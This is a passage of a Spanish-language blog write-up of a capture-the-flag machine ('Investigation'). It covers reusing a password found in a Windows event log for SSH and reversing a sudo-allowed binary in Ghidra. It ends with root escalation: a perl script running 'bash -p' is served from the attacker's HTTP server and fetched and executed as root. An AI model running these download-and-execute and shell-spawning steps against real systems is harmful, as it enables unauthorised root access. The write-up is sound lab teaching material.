</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;EventID&#34;</span>: 4625,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Version&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Level&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Task&#34;</span>: 12544,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Opcode&#34;</span>: 0,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Keywords&#34;</span>: <span style="color:#e6db74">&#34;0x8010000000000000&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;TimeCreated&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;#attributes&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;SystemTime&#34;</span>: <span style="color:#e6db74">&#34;2022-08-01T19:15:15.374769Z&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;EventRecordID&#34;</span>: 11373331,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Correlation&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;#attributes&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;ActivityID&#34;</span>: <span style="color:#e6db74">&#34;6A946884-A5BC-0001-D968-946ABCA5D801&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Execution&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;#attributes&#34;</span>: <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;ProcessID&#34;</span>: 628,
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;ThreadID&#34;</span>: <span style="color:#ae81ff">6800</span>
</span></span></code></pre></div><p>Y detectamos algo extraño, alguien ha intentado iniciar sesión como el usuario <code>Def@ultf0r3nz!csPa$$</code></p>
<p><code>&quot;TargetUserName&quot;: &quot;Def@ultf0r3nz!csPa$$&quot;</code></p>
<p>Tiene toda la pinta de contraseña, y probando como el usuario <code>smorton</code>&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ssh smorton@10.129.228.203
</span></span><span style="display:flex;"><span>smorton@10.129.228.203<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.5 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.0-137-generic x86_64<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  System information as of Tue <span style="color:#ae81ff">13</span> Aug <span style="color:#ae81ff">2024</span> 08:15:41 PM UTC
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  System load:  0.0               Processes:             <span style="color:#ae81ff">231</span>
</span></span><span style="display:flex;"><span>  Usage of /:   59.4% of 3.97GB   Users logged in:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  Memory usage: 13%               IPv4 address <span style="color:#66d9ef">for</span> eth0: 10.129.228.203
</span></span><span style="display:flex;"><span>  Swap usage:   0%
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> updates can be applied immediately.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The list of available updates is more than a week old.
</span></span><span style="display:flex;"><span>To check <span style="color:#66d9ef">for</span> new updates run: sudo apt update
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>smorton@investigation:~$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>smorton<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>smorton<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>smorton<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Y podemos leer la flag de usuario</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>smorton@investigation:~$ cat user.txt 
</span></span><span style="display:flex;"><span>023b407268bf8bc00...
</span></span></code></pre></div><h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Como <code>smorton</code> detectamos que podemos ejecutar un binario como el usuario <code>root</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>smorton@investigation:~$ sudo -l
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> smorton on investigation:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User smorton may run the following commands on investigation:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/binary
</span></span></code></pre></div><p>Si lo ejecutamos..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>smorton@investigation:/usr/bin$ sudo binary
</span></span><span style="display:flex;"><span>Exiting... 
</span></span></code></pre></div><h2 id="reversing-with-ghidra">Reversing with GHidra</h2>
<p>Decompilando el binario con <code>ghidra</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined8 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> param_1,<span style="color:#66d9ef">long</span> param_2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  __uid_t _Var1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar2;
</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>__stream;
</span></span><span style="display:flex;"><span>  undefined8 uVar3;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>__s;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>__s_00;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (param_1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">3</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Exiting... &#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  _Var1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getuid</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (_Var1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Exiting... &#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  iVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>),<span style="color:#e6db74">&#34;lDnxUysaQn&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Exiting... &#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Running... &#34;</span>);
</span></span><span style="display:flex;"><span>  __stream <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>),<span style="color:#e6db74">&#34;wb&#34;</span>);
</span></span><span style="display:flex;"><span>  uVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_easy_init</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">curl_easy_setopt</span>(uVar3,<span style="color:#ae81ff">0x2712</span>,<span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">curl_easy_setopt</span>(uVar3,<span style="color:#ae81ff">0x2711</span>,__stream);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">curl_easy_setopt</span>(uVar3,<span style="color:#ae81ff">0x2d</span>,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  iVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_easy_perform</span>(uVar3);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    iVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">snprintf</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#e6db74">&#34;%s&#34;</span>,<span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>));
</span></span><span style="display:flex;"><span>    __s <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>((<span style="color:#66d9ef">long</span>)iVar2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">snprintf</span>(__s,(<span style="color:#66d9ef">long</span>)iVar2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;%s&#34;</span>,<span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>));
</span></span><span style="display:flex;"><span>    iVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">snprintf</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#e6db74">&#34;perl ./%s&#34;</span>,__s);
</span></span><span style="display:flex;"><span>    __s_00 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>((<span style="color:#66d9ef">long</span>)iVar2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">snprintf</span>(__s_00,(<span style="color:#66d9ef">long</span>)iVar2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;perl ./%s&#34;</span>,__s);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>(__stream);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_easy_cleanup</span>(uVar3);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setuid</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(__s_00);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;rm -f ./lDnxUysaQn&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Exiting... &#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (param_1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">3</span>) { <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Exiting... &#34;</span>); <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>); }
</span></span></code></pre></div><p>El programa verifica si el primer argumento (<code>param_1</code>) es igual a 3. Si no es 3, imprime &ldquo;Exiting&hellip;&rdquo; y termina la ejecución.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>_Var1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getuid</span>(); <span style="color:#66d9ef">if</span> (_Var1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) { <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Exiting... &#34;</span>); <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>); }
</span></span></code></pre></div><p>Obtiene el identificador de usuario (UID) actual usando <code>getuid()</code>. Si el UID no es 0 (que normalmente representa el usuario root), imprime &ldquo;Exiting&hellip;&rdquo; y termina la ejecución.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>iVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>),<span style="color:#e6db74">&#34;lDnxUysaQn&#34;</span>); <span style="color:#66d9ef">if</span> (iVar2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) { <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Exiting... &#34;</span>); <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>); }
</span></span></code></pre></div><p>Compara un valor obtenido de <code>param_2</code> con la cadena <code>&quot;lDnxUysaQn&quot;</code>. Si no coinciden, imprime &ldquo;Exiting&hellip;&rdquo; y termina la ejecución.</p>
<p>Sabiendo esto&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>smorton@investigation:/usr/bin$ sudo binary <span style="color:#ae81ff">3</span> lDnxUysaQn
</span></span><span style="display:flex;"><span>Running... 
</span></span><span style="display:flex;"><span>^C
</span></span></code></pre></div><p>Luego realiza una descarga de un binario que <strong>realiza una petición de descarga al primer parámetro</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>__stream <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>),<span style="color:#e6db74">&#34;wb&#34;</span>); uVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_easy_init</span>(); <span style="color:#a6e22e">curl_easy_setopt</span>(uVar3,<span style="color:#ae81ff">0x2712</span>,<span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>)); <span style="color:#a6e22e">curl_easy_setopt</span>(uVar3,<span style="color:#ae81ff">0x2711</span>,__stream); <span style="color:#a6e22e">curl_easy_setopt</span>(uVar3,<span style="color:#ae81ff">0x2d</span>,<span style="color:#ae81ff">1</span>); iVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_easy_perform</span>(uVar3);
</span></span></code></pre></div><ul>
<li>Abre un archivo para escritura binaria con el nombre obtenido de <code>param_2</code>.</li>
<li>Inicializa una sesión de <code>libcurl</code> y configura las opciones:
<ul>
<li>URL desde la que descargar (<code>curl_easy_setopt(uVar3,0x2712,*(undefined8 *)(param_2 + 8))</code>).</li>
<li>Archivo para guardar la descarga (<code>curl_easy_setopt(uVar3,0x2711,__stream)</code>).</li>
<li>Opciones adicionales (<code>curl_easy_setopt(uVar3,0x2d,1)</code>).</li>
</ul>
</li>
<li>Realiza la descarga (<code>curl_easy_perform(uVar3)</code>).</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (iVar2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) { iVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">snprintf</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#e6db74">&#34;%s&#34;</span>,<span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>)); __s <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>((<span style="color:#66d9ef">long</span>)iVar2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>); <span style="color:#a6e22e">snprintf</span>(__s,(<span style="color:#66d9ef">long</span>)iVar2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;%s&#34;</span>,<span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>)); iVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">snprintf</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#e6db74">&#34;perl ./%s&#34;</span>,__s); __s_00 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>((<span style="color:#66d9ef">long</span>)iVar2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>); <span style="color:#a6e22e">snprintf</span>(__s_00,(<span style="color:#66d9ef">long</span>)iVar2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;perl ./%s&#34;</span>,__s); <span style="color:#a6e22e">fclose</span>(__stream); <span style="color:#a6e22e">curl_easy_cleanup</span>(uVar3); <span style="color:#a6e22e">setuid</span>(<span style="color:#ae81ff">0</span>); <span style="color:#a6e22e">system</span>(__s_00); <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;rm -f ./lDnxUysaQn&#34;</span>); <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; }
</span></span></code></pre></div><p>Si la descarga es exitosa (<code>iVar2 == 0</code>):</p>
<ul>
<li>Crea una cadena que contiene el nombre del archivo descargado.</li>
<li>Construye un comando para ejecutar el archivo descargado usando Perl (<code>perl ./filename</code>).</li>
<li>Limpia recursos y restablece el UID al valor de root (<code>setuid(0)</code>).</li>
<li>Ejecuta el comando con <code>system()</code> para ejecutar el archivo descargado.</li>
<li>Borra el archivo descargado con <code>system(&quot;rm -f ./lDnxUysaQn&quot;)</code>.</li>
</ul>
<p>Vemos que efectivamente, descarga un binario con el nombre <code>lDnxUysaQn</code> aunque esta no es exitosa.
<img src="images/Screenshot_15.png" alt="Write-up Image"></p>
<p><code>-rw-r--r--  1 root     root           0 Aug 13 20:25 lDnxUysaQn</code> este archivo es de <code>root</code> y en principio debería de ser un script en perl que luego se ejecutará.</p>
<h2 id="exploiting-our-knowledge">Exploiting our knowledge</h2>
<p>Vamos a ver si como hemos visto en el código si estableciendo el primer parámetro mi IP me llega una petición de descarga.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#ae81ff">8081</span>
</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8081</span> <span style="color:#f92672">(</span>http://0.0.0.0:8081/<span style="color:#f92672">)</span> ...
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo binary http://10.10.14.85:8081/pointedsec lDnxUysaQn
</span></span><span style="display:flex;"><span>Running... 
</span></span><span style="display:flex;"><span>Exiting...
</span></span></code></pre></div><p>¡Perfecto!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#ae81ff">8081</span>
</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8081</span> <span style="color:#f92672">(</span>http://0.0.0.0:8081/<span style="color:#f92672">)</span> ...
</span></span><span style="display:flex;"><span>10.129.228.203 - - <span style="color:#f92672">[</span>14/Aug/2024 00:31:55<span style="color:#f92672">]</span> code 404, message File not found
</span></span><span style="display:flex;"><span>10.129.228.203 - - <span style="color:#f92672">[</span>14/Aug/2024 00:31:55<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /pointedsec HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> -
</span></span></code></pre></div><p>Ahora simplemente serviremos un script en <code>perl</code> que se ejecutará en el sistema.</p>
<p><code>privesc.</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/perl</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> strict;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> warnings;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exec(<span style="color:#e6db74">&#34;bash -p&#34;</span>);
</span></span></code></pre></div><p>Lo servimos por el puerto 8081 y al ejecutar el binario estableciendo este archivo como segundo parámetro..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#ae81ff">8081</span>
</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8081</span> <span style="color:#f92672">(</span>http://0.0.0.0:8081/<span style="color:#f92672">)</span> ...
</span></span><span style="display:flex;"><span>10.129.228.203 - - <span style="color:#f92672">[</span>14/Aug/2024 00:32:56<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /privesc.pl HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
</span></span></code></pre></div><p>Nos convertimos en <code>root</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>smorton@investigation:/tmp$ sudo binary http://10.10.14.85:8081/privesc.pl lDnxUysaQn
</span></span><span style="display:flex;"><span>Running... 
</span></span><span style="display:flex;"><span>root@investigation:/tmp# id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root
</span></span></code></pre></div><p>Y ya podríamos leer la flag de <code>root</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@investigation:/tmp# cat /root/root.txt
</span></span><span style="display:flex;"><span>13310bc79b0a86a...
</span></span></code></pre></div><p>¡Y ya estaría!</p>
<p>Happy Hacking! 🚀</p>

    </div>

    

            </div>
        </div><footer class="text-center pb-1">
    <small class="text-muted">
        
            &copy; 2024, Andrés Del Cerro
        
        <br>
        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
    </small>
</footer>
</body>
</html>
